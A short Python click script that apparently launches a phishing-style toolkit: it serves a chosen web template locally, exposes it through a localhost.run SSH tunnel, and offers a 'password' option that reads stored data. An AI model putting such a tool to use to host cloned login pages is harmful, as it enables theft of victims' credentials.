import click
import subprocess
from scripts import props, manage_data

@click.command()
@click.option("--template", '-t', default="None" , 
                help="Web template name.   \033[92mpython my_soup.py -t Name\n\033[0m")
@click.option("--password", '-p', default=False,  
                help="View action history. \033[92mpython my_soup.py -p True\n\033[0m")
@click.option("--info",     '-i', default=False,
                help="View info tools.     \033[92mpython my_soup.py -i True\n\033[0m")

def main(template, password, info):
    if (template != "None"):
        subprocess.call(['python3', './server.py', '-t', template, '-p', "8080"])

    elif (password):
        manage_data .read_data()

    elif (info):
        print(props.INFO)

    else:
        option = props.banner()
        port = props.port()
        subdomain = props.localhost_run()

        if (subdomain):
            subprocess.call(['bash', './scripts/open.sh', option, port])
        
        else:
            subprocess.call(['python3', './server.py', '-t', option, '-p', port])


if __name__ == "__main__":
    main()  


#  konsole --noclose -e python3 ./scripts/server.py -s option -p port 
#| konsole --noclose -e ssh -R 80:localhost:8080 test.localhost.run 